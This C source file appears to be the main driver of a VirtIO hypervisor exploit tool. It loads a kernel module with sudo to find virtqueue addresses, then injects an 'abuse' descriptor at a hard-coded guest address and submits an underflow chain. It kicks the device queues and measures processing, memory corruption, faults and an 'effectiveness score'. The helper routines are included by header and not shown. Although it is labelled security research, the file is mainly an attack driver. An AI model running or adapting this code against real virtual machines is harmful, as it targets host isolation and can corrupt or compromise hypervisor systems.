#define _POSIX_C_SOURCE 200809L  /* must be before any system header */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <signal.h>
#include <time.h>   /* for nanosleep */

#include "virtio_structs.h"
#include "buffer_management.h"
#include "device_discovery.h"
#include "descriptor_injection.h"
#include "queue_kicking.h"
#include "submission_methods.h"
#include "descriptor_tracking.h"
#include "fault_detection.h"
#include "exploit_feedback.h"

/* helpers to avoid blocking on getchar() */
static int auto_yes(void) {
    const char *v = getenv("AUTO_YES");
    return v && *v; /* any non-empty value */
}

static void pause_or_continue(const char *msg) {
    if (auto_yes()) {
        printf("%s [auto-continue]\n", msg);
    } else {
        printf("%s\n", msg);
        getchar();
    }
}

static int getenv_int(const char *name, int defval) {
    const char *v = getenv(name);
    if (!v || !*v) return defval;
    int n = atoi(v);
    return (n > 0) ? n : defval;
}

int main(void) {
    printf("VirtIO Advanced Security Research Tool\n");
    printf("======================================\n");
    printf("Features: Virtqueue targeting, descriptor lifecycle tracking,\n");
    printf("          fault detection, and exploit effectiveness analysis\n\n");

    // === INITIALIZATION ===
    initialize_feedback_collection();
    capture_pre_exploit_state();

    // === BUFFER ALLOCATION ===
    if (allocate_buffers() != 0) {
        printf("Failed to allocate buffers\n");
        return 1;
    }

    // === VIRTIO DEVICE DISCOVERY ===
    pause_or_continue("\nPress Enter to discover VirtIO devices and load kernel module...");

    // Suggest loading kernel module for precise virtqueue targeting
    printf("Loading virtqueue logger kernel module (if available)...\n");
    system("sudo insmod kernel_module/virtqueue_logger.ko 2>/dev/null || echo 'Kernel module not available - using heuristic targeting'");

    find_virtio_devices();
    find_virtqueues();
    examine_virtio_pci();

    // Check if kernel module provided virtqueue addresses
    system("modprobe virtqueue_logger || insmod ./virtqueue_logger.ko");
    sleep(1);  // Give the module time to populate /proc
    system("cat /proc/virtqueue_addrs 2>/dev/null || echo 'No precise virtqueue addresses available'");

    // === DESCRIPTOR CREATION ===
    struct virtq_desc normal_desc, abuse_desc;
    create_descriptors(&normal_desc, &abuse_desc);

    // Allocate a fake header buffer for underflow test
    size_t guest_hdr_len = 512;  
    void *guest_hdr = malloc(guest_hdr_len);
    if (!guest_hdr) {
        perror("malloc");
        return 1;
    }
    memset(guest_hdr, 0x41, guest_hdr_len);  // Fill with 'A'

    // === STAGE 1: ADVANCED DESCRIPTOR SUBMISSION ===
    pause_or_continue("\nPress Enter to begin advanced descriptor submission with tracking...");

    start_exploit_timing();

    try_virtio_net_submission(&abuse_desc);
    try_virtio_block_submission(&abuse_desc);
    try_vfio_submission(&abuse_desc);
    try_direct_memory_submission(&abuse_desc);

    // Enhanced injection with tracking
    printf("\nAttempting direct injection with lifecycle tracking...\n");
    locate_virtqueue_in_guest_ram();

    // Track the injected descriptor using the address found by locate_virtqueue_in_guest_ram
    uintptr_t injected_virtqueue = 0x3f8ed000; // Address from DMA coherent region scan
    printf("Registering injected descriptor for tracking at 0x%lx...\n", injected_virtqueue);
    int tracking_id = track_descriptor_injection(injected_virtqueue, 0, &abuse_desc);
    if (tracking_id >= 0) {
        printf("Descriptor registered for tracking (ID: %d)\n", tracking_id);
    } else {
        printf("Failed to register descriptor for tracking\n");
    }

    // === NEW: UNDERFLOW CHAIN SUBMISSION ===
    printf("\n=== Attempting Underflow Chain Submission ===\n");
    submit_underflow_chain((void*)injected_virtqueue, guest_hdr, guest_hdr_len);

    find_virtqueue_via_proc_maps();

    record_injection_complete();

    // === STAGE 2: MONITORED QUEUE KICKING ===
    pause_or_continue("\nPress Enter to execute queue kicking with monitoring...");

    // Start kernel log monitoring in background (default 5s; override with MONITOR_SECS)
    int monitor_secs = getenv_int("MONITOR_SECS", 5);
    printf("Starting kernel log monitoring for %d seconds...\n", monitor_secs);
    pid_t monitor_pid = fork();
    if (monitor_pid == 0) {
        monitor_kernel_logs(monitor_secs);
        _exit(0);
    }

    comprehensive_queue_kicking();
    record_kicking_complete();

    // === STAGE 3: DESCRIPTOR PROCESSING ANALYSIS ===
    pause_or_continue("\nPress Enter to analyze descriptor processing...");

    // Use the actual virtqueue address we injected into
    uintptr_t target_virtqueue = injected_virtqueue;
    printf("Monitoring descriptor processing at address 0x%lx...\n", target_virtqueue);

    int processed = check_descriptor_processing(target_virtqueue, 5000); // 5 second timeout
    if (processed > 0) {
        printf("SUCCESS: Descriptors were processed by device!\n");
    } else {
        printf("No descriptor processing detected within timeout\n");
    }

    monitor_used_ring_changes(target_virtqueue, 3000); // 3 second monitoring
    dump_descriptor_state();

    // === STAGE 4: COMPREHENSIVE ANALYSIS ===
    pause_or_continue("\nPress Enter for post-exploit analysis...");

    // Wait for background monitoring to complete
    if (monitor_pid > 0) {
        int status;
        const int timeout_ms = 5000;
        const int step_ms = 100;
        int waited = 0;

        while (waited < timeout_ms) {
            pid_t r = waitpid(monitor_pid, &status, WNOHANG);
            if (r == monitor_pid) break; // child exited

            struct timespec ts = { .tv_sec = 0, .tv_nsec = (long)step_ms * 1000000L };
            nanosleep(&ts, NULL);

            waited += step_ms;
        }
        if (waited >= timeout_ms) {
            printf("Monitor process timeout - terminating\n");
            kill(monitor_pid, SIGTERM);
            waitpid(monitor_pid, &status, 0);
        }
    }

    capture_post_exploit_state();
    detect_system_faults();

    analyze_memory_corruption();
    analyze_device_behavior();
    calculate_effectiveness_score();

    printf("\nGenerating comprehensive reports...\n");

    print_exploit_feedback();
    save_feedback_log("/tmp/virtio_exploit_feedback.log");
    save_fault_report("/tmp/virtio_exploit_faults.log");

    printf("\nExploit analysis complete. Report files saved to /tmp/\n");

    // === CLEANUP ===
    pause_or_continue("\nPress Enter to cleanup and exit...");

    system("sudo rmmod virtqueue_logger 2>/dev/null");
    cleanup_buffers();

    free(guest_hdr);

    printf("Cleanup complete. Check /tmp/ for detailed logs.\n");
    return 0;
}
